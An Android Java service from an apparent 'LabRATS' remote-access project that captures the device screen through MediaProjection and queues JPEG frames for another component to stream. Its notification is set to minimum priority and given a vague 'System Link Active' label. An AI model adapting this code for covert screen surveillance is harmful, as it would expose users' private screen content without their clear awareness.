package com.labs.labrats;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.TimeUnit;

public class ScreenShareService extends Service {
    private static final String TAG = "ScreenShareService";
    private static final String CHANNEL_ID = "ScreenShareChannel";
    private static final int NOTIFICATION_ID = 4004;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    private static volatile boolean isRunning = false;
    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(5);

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        HandlerThread thread = new HandlerThread("ScreenCaptureThread");
        thread.start();
        backgroundHandler = new Handler(thread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "START".equals(intent.getAction())) {
            if (isRunning) {
                Log.d(TAG, "Screen capture already running");
                return START_NOT_STICKY;
            }
            int resultCode = intent.getIntExtra("resultCode", 0);
            Intent data = intent.getParcelableExtra("data");

            if (resultCode != 0 && data != null) {
                startCapture(resultCode, data);
            }
        } else if (intent != null && "STOP".equals(intent.getAction())) {
            stopCapture();
            stopSelf();
        }
        return START_NOT_STICKY;
    }

    private void startCapture(int resultCode, Intent data) {
        // 1. Create Notification
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("🛡️ System Link Active")
                .setContentText("Uplink established...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN) // Less intrusive
                .build();

        // 2. Start Foreground (Android 16 requirement: MUST be first)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        // 3. Immediate Initialization (No delay for Android 16)
        MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        try {
            mediaProjection = mpManager.getMediaProjection(resultCode, data);
        } catch (Exception e) {
            Log.e(TAG, "Projection Token Rejected: " + e.getMessage());
            stopSelf();
            return;
        }

        if (mediaProjection == null) {
            stopSelf();
            return;
        }

        // 4. Register Callback (Crucial Order)
        mediaProjection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                Log.d(TAG, "OS terminated projection");
                stopCapture();
            }
        }, backgroundHandler);

        // 5. Setup Display and Metrics
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int width = 720; // Standardize resolution for stability
        int height = (int) (width * ((float) metrics.heightPixels / metrics.widthPixels));
        if (height % 2 != 0) height--;

        try {
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = mediaProjection.createVirtualDisplay("LabRATS-Uplink",
                    width, height, metrics.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_PRESENTATION, // More stable flag
                    imageReader.getSurface(), null, backgroundHandler);

            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image != null) processImage(image);
                } catch (Exception e) {
                    // Ignore transient acquisition errors
                } finally {
                    if (image != null) image.close();
                }
            }, backgroundHandler);

            isRunning = true;
            Log.d(TAG, "Android 16 Uplink Active: " + width + "x" + height);

        } catch (Exception e) {
            Log.e(TAG, "Display Bridge Failed: " + e.getMessage());
            stopCapture();
            stopSelf();
        }
    }

    private void processImage(Image image) {
        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int width = image.getWidth();
            int height = image.getHeight();

            // Calculate bitmap width based on stride to avoid BufferUnderflowException
            int bitmapWidth = rowStride / pixelStride;
            
            if (buffer.remaining() < rowStride * height) {
                return; // Not enough data
            }

            Bitmap bitmap = Bitmap.createBitmap(bitmapWidth, height, Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);

            // Crop to actual width if there was padding
            if (bitmapWidth != width) {
                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                bitmap.recycle();
                bitmap = cropped;
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 35, baos); // Slightly lower quality for stability
            byte[] bytes = baos.toByteArray();

            if (frameQueue.remainingCapacity() == 0) {
                frameQueue.poll();
            }
            frameQueue.offer(bytes);

            bitmap.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Process error: " + e.getMessage());
        }
    }

    private void stopCapture() {
        isRunning = false;
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        if (mediaProjection != null) mediaProjection.stop();
    }

    public static byte[] getNextFrame() {
        try {
            return frameQueue.poll(500, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            return null;
        }
    }

    public static boolean isStreaming() {
        return isRunning;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Screen Share", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        stopCapture();
        super.onDestroy();
    }
}
